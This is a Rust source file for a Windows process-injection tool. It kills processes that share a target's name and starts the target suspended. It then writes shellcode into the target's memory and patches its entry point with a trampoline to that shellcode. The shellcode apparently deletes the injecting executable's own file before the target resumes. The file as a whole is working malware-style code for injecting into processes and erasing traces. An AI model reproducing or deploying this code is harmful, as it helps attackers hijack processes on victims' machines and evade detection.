use core::fmt;
use iced_x86::IcedError;
use toolkit::*;
use winapi::shared::ntdef::{NTSTATUS, OBJECT_ATTRIBUTES, UNICODE_STRING};

use crate::{encoder::EncoderError, injector::ProcessInjector, shellcode::Shellcode};

#[derive(Debug)]
pub enum InjectionError {
    NtStatus(NTSTATUS),
    ShellcodeError(EncoderError),
    ProcessNotFound,
    ThreadError,
    MemoryError,
    InjectionFailed,
}

impl From<NTSTATUS> for InjectionError {
    fn from(status: NTSTATUS) -> Self {
        InjectionError::NtStatus(status)
    }
}

impl From<InjectionError> for i32 {
    fn from(err: InjectionError) -> Self {
        match err {
            InjectionError::NtStatus(status) => status as i32,
            InjectionError::ShellcodeError(_) => 0xC000000Du32 as i32,
            InjectionError::ProcessNotFound => 0xC0000034u32 as i32,
            InjectionError::ThreadError => 0xC000000Du32 as i32,
            InjectionError::MemoryError => 0xC0000017u32 as i32,
            InjectionError::InjectionFailed => 0xC0000005u32 as i32,
        }
    }
}

pub struct InjectionBuilder<const N: usize> {
    target_path: U16CStackString<N>,
    executable_path: ExecutablePath,
    process: Option<ProcessInjector>,
    thread_handle: Option<ThreadHandle>,
    nt_delete_address: Option<u64>,
    entrypoint: Option<*mut winapi::ctypes::c_void>,
}

impl<const N: usize> InjectionBuilder<N> {
    pub fn new(file_path: U16CStackString<N>) -> Self {
        let target_path: U16CStackString<N> = Self::prepare_path(&file_path);
        let executable_path = ProcessEnvironmentBlock::current_process().executable_path();
        // let target_path = U16CStackString::<N>::from_u16_slice(executable_path.as_slice()).unwrap();
        // let target_path = Self::prepare_path(&target_path);

        Self {
            target_path,
            executable_path,
            process: None,
            thread_handle: None,
            nt_delete_address: None,
            entrypoint: None,
        }
    }

    pub fn build(mut self) -> Result<(), InjectionError> {

        self.kill_existing_processes()?;
        self.create_suspended_process()?;
        self.inject_shellcode()?;
        self.resume_process()?;

        Ok(())
    }

    fn kill_existing_processes(&mut self) -> Result<(), InjectionError> {
        let name = self.target_path
            .get_filename()
            .ok_or(InjectionError::ProcessNotFound)?
            .as_u8_stack_string::<20>();

        while let Some(pid) = ProcessQuerier::find_process_by_name(&name) {
            println!("Killing {}", pid);
            if ProcessKiller::kill_by_pid(pid, 0).is_err() {
                return Ok(());
            }
            toolkit::Sleeper::sleep(100);
        }
        Ok(())
    }

    fn create_suspended_process(&mut self) -> Result<(), InjectionError> {
        let mut process = ProcessInjector::new_suspended(self.target_path.clone())?;
        self.entrypoint = process.entrypoint().ok();
        self.process = Some(process);
        Ok(())
    }

    fn inject_shellcode(&mut self) -> Result<(), InjectionError> {
        let process = self.process.as_mut().ok_or(InjectionError::ProcessNotFound)?;
        let executable_path = U16CStackString::<N>::from_u16_slice(self.executable_path.as_slice()).unwrap();
        let executable_path = Self::prepare_path(&executable_path);
        let obj_attr_addr = process.allocate_object_attributes(executable_path.as_slice())?;

        // let bytes = ProcessMemoryReader::read_remote_bytes_fixed::<300>(process.handle(), obj_attr_addr).unwrap();
        // println!("{}", bytes);
        // let obj_attrs: OBJECT_ATTRIBUTES = ProcessMemoryReader::read_remote(process.handle(), obj_attr_addr)?;
        // let unicode_str: UNICODE_STRING = ProcessMemoryReader::read_remote(process.handle(), obj_attrs.ObjectName as _)?;
        // let str = ProcessMemoryReader::read_remote::<[u16;80]>(process.handle(), unicode_str.Buffer as _)?;
        // let str = U16CStackString::<100>::from_u16_slice(&str).unwrap();
        // println!("{str} Length={} MaximumLength={}", unicode_str.Length, unicode_str.MaximumLength );
        let shellcode = Shellcode::<500>::try_remove_file(
            obj_attr_addr as usize,
            2000,
            100,
        ).map_err(InjectionError::ShellcodeError)?;

        let entrypoint = self.entrypoint
            .ok_or(InjectionError::InjectionFailed)?;

        let addr = process.allocate_with_data(&shellcode.into_inner())?;

        let trampoline = Shellcode::<200>::trampoline_to(addr as usize)
            .map_err(InjectionError::ShellcodeError)?;

        process.inject_at(entrypoint, trampoline)
            .map_err(|_| InjectionError::InjectionFailed)?;

        Ok(())
    }

    fn resume_process(&mut self) -> Result<(), InjectionError> {
        let process = self.process.as_mut().ok_or(InjectionError::ProcessNotFound)?;
        process.resume().map_err(|_| InjectionError::InjectionFailed)?;
        Ok(())
    }

    fn prepare_path(path: &U16CStackString<N>) -> U16CStackString<N> {
        let mut result = unsafe { 
            U16CStackString::<N>::from_ptr(path.as_ptr())
                .unwrap_or_default()
        };
        result.prepend(r#"\??\"#);
        result
    }
}